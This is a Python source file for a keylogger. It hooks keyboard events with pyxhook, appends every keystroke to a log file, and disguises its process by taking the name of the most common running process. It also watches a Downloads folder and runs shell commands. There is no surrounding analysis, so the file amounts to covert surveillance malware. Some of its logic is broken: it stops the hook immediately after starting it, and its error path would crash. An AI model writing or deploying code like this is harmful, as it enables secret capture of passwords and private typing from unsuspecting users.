import subprocess
import setproctitle
import psutil
import os
import pyxhook


from watch import Watch


def get_best_process_name():
    process_dict = {}
    for proc in psutil.process_iter():
        try:
            process_name = proc.name()
            if process_name in process_dict:
                process_dict.update({process_name: process_dict.get(process_name) + 1})
            else:
                process_dict[process_name] = 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    best_process_name = next(iter(process_dict))
    for process_name in process_dict:
        if process_dict.get(process_name) > process_dict.get(best_process_name):
            best_process_name = process_name
    return best_process_name


def start_keylogger():
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            if event.Key == "Return":
                event.Key = "\n"
            f.write('{}'.format(event.Key))

    new_hook.KeyDown = OnKeyPress
    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        msg = 'Error while catching events:\n  {}'.format(ex)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))


def stop_keylogger():
    new_hook.cancel()


def run_command(command):
    try:
        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = data.communicate()
    except Exception:
        out = ("psh: command not found: {}".format(command))
    print(out.decode())


if __name__ == '__main__':
    log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
    new_hook = pyxhook.HookManager()
    setproctitle.setproctitle(get_best_process_name())
    start_keylogger()
    stop_keylogger()
    watch = Watch()
    watch.add_watched("/root/Downloads", True)
    watch.start()
    watch.stop()
    run_command("ls")
    run_command("ls -a")
